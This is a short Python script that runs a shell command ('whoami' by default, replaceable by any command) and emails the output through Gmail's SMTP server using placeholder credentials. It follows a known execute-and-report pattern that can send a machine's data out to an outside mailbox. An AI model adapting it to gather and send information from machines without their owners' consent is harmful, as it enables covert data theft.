#!usr/bin/env python
import subprocess, smtplib

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)    #smtp.gmail.com (GOOGLE SMTP SERVER) at port 587
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)          #send mail method from (sender) to (reciever) with a message
    server.quit()

command = "whoami"  # Replace with the actual command you want to execute

result = subprocess.check_output(command, shell=True)
send_mail("email_address", "password ", result)    #Enter email address and password in the defined fields Format(email@gmail.com)
# Note: Make sure to enable "Less secure app access" in your Google account settings to allow this script to send emails.
# Alternatively, you can use an app password if you have 2FA enabled.